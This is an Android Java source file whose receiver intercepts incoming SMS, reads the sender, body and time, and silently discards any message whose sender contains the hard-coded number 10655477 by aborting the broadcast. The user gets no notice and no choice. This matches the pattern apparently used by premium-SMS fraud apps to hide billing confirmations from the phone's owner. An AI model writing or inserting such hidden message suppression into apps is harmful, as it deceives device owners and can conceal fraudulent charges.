package com.tugkgp.cn.receive;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class InterceptionSMS extends BroadcastReceiver 
{

    private String TAG="InterceptionSMS";
    //广播消息类型
    public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    //覆盖onReceive方法
    @Override
    public void onReceive(Context context, Intent intent) 
    {
        // TODO Auto-generated method stub
        Log.i(TAG, "引发接收事件");
        //先判断广播消息
        String action = intent.getAction();
        if (SMS_RECEIVED_ACTION.equals(action))
        {
            //获取intent参数
            Bundle bundle=intent.getExtras();
            //判断bundle内容
            if (bundle!=null)
            {
                //取pdus内容,转换为Object[]
                Object[] pdus=(Object[])bundle.get("pdus");
                //解析短信
                SmsMessage[] messages = new SmsMessage[pdus.length];
                for(int i=0;i<messages.length;i++)
                {
                    byte[] pdu=(byte[])pdus[i];
                    messages[i]=SmsMessage.createFromPdu(pdu);
                }    
                //解析完内容后分析具体参数
                for(SmsMessage msg:messages)
                {
                    //获取短信内容
                    String content=msg.getMessageBody();
                    String sender=msg.getOriginatingAddress();
                    Date date = new Date(msg.getTimestampMillis());
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                    String sendTime = sdf.format(date);
                    if (sender!=null&&sender.contains("10655477")) 
                    {
                        //对于特定的内容,取消广播
                        abortBroadcast();
                        
                       // Log.v("拦截短信", "内容:"+content);
                    }
                    else
                    {
                        //Log.v("读取短信", "内容:"+"收到:"+sender+"内容:"+content+"时间:"+sendTime.toString());
                    }
                }
                
            }
        }//if 判断广播消息结束
    }

}